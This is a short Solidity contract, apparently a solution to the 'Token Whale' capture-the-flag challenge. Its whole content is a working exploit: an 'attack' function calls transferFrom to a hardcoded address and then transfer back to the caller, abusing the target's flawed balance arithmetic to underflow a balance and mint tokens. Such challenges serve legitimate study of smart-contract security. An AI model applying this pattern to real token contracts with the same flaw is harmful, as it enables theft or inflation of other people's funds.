pragma solidity ^0.4.21;

import "./TokenWhaleChallenge.sol";

contract Attack {

    TokenWhaleChallenge target;

    function Attack(address _targetAddress) public {
        target = TokenWhaleChallenge(_targetAddress);
    }

    function attack(uint256 value) external {
        target.transferFrom(msg.sender, 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, value);
        target.transfer(msg.sender, 1000000);
    }

    function() public payable {}
}